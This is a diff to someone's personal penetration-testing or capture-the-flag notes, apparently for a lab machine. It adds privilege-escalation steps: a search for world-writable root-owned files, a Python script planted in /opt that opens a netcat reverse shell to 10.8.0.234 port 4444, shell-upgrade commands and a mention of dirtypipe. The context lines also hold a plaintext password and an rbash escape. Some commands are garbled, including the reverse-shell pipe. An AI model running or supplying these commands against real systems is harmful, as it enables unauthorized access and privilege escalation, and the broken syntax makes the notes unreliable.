@@ -91,8 +91,31 @@
                         pass: P@55W0rd1!2@
             #ssh mindy to the target, get a rbash, to switch to a shell 
             ssh name#IP "export TERM=xterm; python -c ‘import pty.spawn(\"/bin/bash\")’"
-            # work with the exploit 35513, get a shell finally. 
+            # work with the exploit 35513, get a shell finally. .
 
+        #esclate priv
+        uname,kernel, process, cron, writable file or dirc, SUID, home, env, sudo -s, getcap
+        $uname -a    i686 means a 32bit OS, use gcc to create a 32bit file 
+
+        $find / -type f -user root -perm -o=w 2>/dev/null | grep -v 'proc\|sys'
+
+            
+            # type file, owned by root, priv wirte, unmask proc or sys
+
+            cat <<< xxx > /opt/tmp.py    
+            #!/usr/bin/env python
+            import os
+            import sys
+            try:
+                 os.system('rm /tmp/f; mkfifo /tmp/f;cat /tmp/f/bin/sh -i 2>&1|nc 10.8.0.234 4444 > /tmp/f')
+            except:
+                 sys.exit() >/opt/tmp.py
+
+
+            #to get a full tty
+                on the condition of a better python shell,ctrl+z, stty raw -echo, fg, export SHELL=/bin/bash
+                # the $ export TERM=srcreen, stty rows xx columns xx, reset
+            dirtypipe
 
 
 
